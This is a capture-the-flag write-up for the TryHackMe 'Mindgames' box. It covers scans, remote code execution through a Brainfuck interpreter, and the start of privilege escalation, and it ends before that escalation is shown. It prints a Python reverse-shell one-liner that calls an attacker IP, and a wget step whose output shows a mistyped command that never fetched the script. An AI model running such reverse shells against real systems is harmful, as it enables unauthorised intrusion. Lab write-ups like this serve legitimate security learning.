# TryHackMe Mindgames Writeup

Challenge Link: [Mindgames](https://tryhackme.com/room/mindgames)

Mindgames is a hard rated box on TryHackMe. We're tasked with enumerating, gaining initial access, then a somewhat tricky privilege escalation using a Library Load via OpenSSL.

## Recon

There wasn't that much enumeration to do since we only found 2 ports open: 22 running ssh and 80 running a HTTP server from our NMAP scan.

```markdown
# Nmap 7.80 scan initiated Tue Jun 16 23:26:12 2020 as: nmap -sC -sV -o nmap 10.10.91.145
Nmap scan report for 10.10.91.145
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

We see that port 80 is open, so I decided to run a GoBuster scan to see if we could find anything. After about 10 minutes of scanning, I figured there were no directories on the site.
```markdown
root@kali:~/THM/mindgames# gobuster dir -u 10.10.91.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.91.145
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/17 10:21:52 Starting gobuster
===============================================================
Progress: 19932 / 87665 (22.74%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/06/17 10:29:03 Finished
===============================================================
```

## Initial Shell

Let's go check out the page!
![image]({{0xtaylur.github.io}}/assets/mindgames_page.png)

Hmmm, very intersting. Seems as if the the page decodes the _Brainfuck_ programming language. Let's see what happens when we throw the "Hello, World" section into the textbox.
![image]({{0xtaylur.github.io}}/assets/hello_world.png)

It just prints _"Hello, World"_. Now let's see what happens when we try it with the Fibonacci brainfuck text.
![image]({{0xtaylur.github.io}}/assets/fibonacci.png)

So it seems like it it runs the actual brainfuck progamming language. Let's see if we can try to get a reverse shell with this knowledge. I headed over to the [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and used the python reverse shell code.
```markdown
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

After I changed the default IP in that code block to my tun0 IP.(You can find that out by using the command _ifconfig_ in your terminal).I started a netcat session listening on port 1234. I then headed over to a brainfuck encoder to convert it, let's throw this code into the mindgames site and see if we can get an initial shell.

We successfully get a reverse shell as user: _mindgames_
![image]({{0xtaylur.github.io}}/assets/initial_shell.png)

From here, we can go back one directory and read into _user.txt_
![image]({{0xtaylur.github.io}}/assets/user.png)

## Privilege Escalation

Let's start off with using LinEnum to see if we can look into any interesting files that we can use to start our privilege escalation. On your host machine, change into your directory where you have _LinEnum_ stored. If you do not have LinEnum you can get it [here](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) by using the _wget_ command.

On your host machine, start a SimpleHTTPServer on port 8000 by using this command.
```markdown
python -m SimpleHTTPServer
```

Change into the /tmp directory on your reverse shell, we can use the _wget_ command to put LinEnum.sh on the machine so we can run it.
```markdown
$ wget YOUR_IP:8000 LinEnum.sh
--2020-06-17 15:29:50--  http://YOUR_IP:8000/
Connecting to YOUR_IP:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 218 [text/html]
Saving to: ‘index.html’

     0K                                                       100% 30.3M=0s

2020-06-17 15:29:50 (30.3 MB/s) - ‘index.html’ saved [218/218]

--2020-06-17 15:29:50--  http://linenum.sh/
Resolving linenum.sh (linenum.sh)... failed: Name or service not known.
wget: unable to resolve host address ‘linenum.sh’
FINISHED --2020-06-17 15:29:51--
Total wall clock time: 0.7s
Downloaded: 1 files, 218 in 0s (30.3 MB/s)
```

Now let's make it an executable file, by using _chmod +x LinEnum.sh_. Run LinEnum by using `./LinEnum.sh`
